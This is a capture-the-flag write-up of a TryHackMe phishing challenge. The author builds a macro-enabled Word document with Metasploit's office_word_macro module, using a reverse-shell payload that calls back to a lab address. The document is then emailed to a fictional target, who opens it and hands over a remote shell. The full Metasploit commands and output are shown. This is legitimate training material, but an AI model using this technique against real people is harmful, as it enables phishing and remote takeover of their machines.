---
image: "/assets/img/posts/gh_047d845a4c.png"
title: "Ghost Phishing"
description: "As part of HackfinityBattle, an event organized by TryHackMe, this cybersecurity challenge asked me to simulate a Red Team attack by exploiting a vulnerability linked to opening a Microsoft Word document. The objective was to create a malicious Word document containing a macro, capable of executing a payload when opened, and send it to the target, cipher@darknetmail.corp, ensuring that they opened it to establish a remote connection. This challenge, offered by TryHackMe, aimed to test my Red Team skills, including generating payloads with Metasploit, creating malicious documents via macros, social engineering to trick the target into opening the file, and managing remote sessions in a controlled environment."
pubDate: "2025-03-24"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Description





We managed to access DarkSpecter's email, and this leak contains a direct link to Cipher's latest operations. Encrypted exchanges contain valuable intelligence: information on recent attacks, compromised systems and potential targets. This could be our best chance to predict Cipher's next moves and dismantle its network for good.





## Resolution





First, I connected to the email address provided as part of the challenge to analyze communications and better understand expectations.





[![Email](/assets/img/posts/r_89546ab569.png)](https://i.ibb.co/wFvmjr51/r.png)





Here, as we see, to provide a briefing, cipher@darknetmail.corp asks specter@darknetmail.corp to provide it with a detailed report on a recent operation. The message, sent on March 1, 2025, mentions concerns following an attack and emphasizes the urgency of receiving a complete report, including methodologies, tools used and anomalies encountered. The email also specifies that the report must be sent directly through this channel.





By analyzing this message, I understood that the objective was to create a Word document with a malicious macro to respond to this request, by integrating a payload which would execute when the file was opened by the target, cipher@darknetmail.corp. To do this, I decided to generate a payload by using msfconsole, the Metasploit interface, in order to design an effective attack.





Before starting, I checked the availability of a module suitable for a macro attack on my version of Kali Linux. I used searchsploit to find macro-related exploits:





  `








```bash


$ searchsploit macro





```


`





[![Result](/assets/img/posts/r-1_be9322edca.png)](https://i.ibb.co/bggq4rm6/r-1.png)





The result showed me several options, and I decided to select the first available exploit: LibreOffice `








```bash


$ msf6 > use exploit/multi/fileformat/office_word_macro


[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


$ msf6 exploit(multi/fileformat/office_word_macro) > set payload windows/shell_reverse_tcp 


payload => windows/shell_reverse_tcp


$ msf6 exploit(multi/fileformat/office_word_macro) > set lhost tun0 


lhost => 10.6.8.193


$ msf6 exploit(multi/fileformat/office_word_macro) > set lport 1337


lport => 1337


$ msf6 exploit(multi/fileformat/office_word_macro) > set filename hacked.docm


filename => hacked.docm


$ msf6 exploit(multi/fileformat/office_word_macro) > run


[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx


[*] Injecting payload in document comments


[*] Injecting macro and other required files in document


[*] Finalizing docm: hacked.docm


[+] hacked.docm stored at /home/MrR0807/.msf4/local/hacked.docm





```


`





The module successfully generated a malicious Word document named hacked.docm, containing a macro that will execute the payload when opened. Next, I set up a listener with netcat to receive the connection once the target would open the document





I Next, sent the hacked.docm document to cipher@darknetmail.corp via the email interface.





[![check](/assets/img/posts/hacked_a1a1532979.png)](https://i.ibb.co/vxwNw5H6/hacked.png)





A few minutes later, the target opened the document, which triggered the macro to execute. This allowed me to establish a remote connection and take control of the target's machine:





[![Hacked](/assets/img/posts/r-hacked_e82e7e953e.png)](https://i.ibb.co/ZRsnB6bM/r-hacked.png)





## Ressources supplementaires





Here are some additional resources that might be helpful to you:





[Rapid7 Macro](https://www.rapid7.com/db/modules/exploit/multi/fileformat/office_word_macro/)[Medium](https://medium.com/@calvintconnor/how-to-make-a-reverse-shell-with-microsoft-word-macros-94797534ffb3)Love my artciles? Follow me on [Twitter](https://x.com/@MrR0807) and [Github](https://github.com/0xMrR0807)[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=TryHackMe%20-%20Ghost%20Phishing%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fghost-phishing%2F)       [](https://www.facebook.com/sharer/sharer.php?title=TryHackMe%20-%20Ghost%20Phishing%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fghost-phishing%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fghost-phishing%2F&text=TryHackMe%20-%20Ghost%20Phishing%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fghost-phishing%2F)


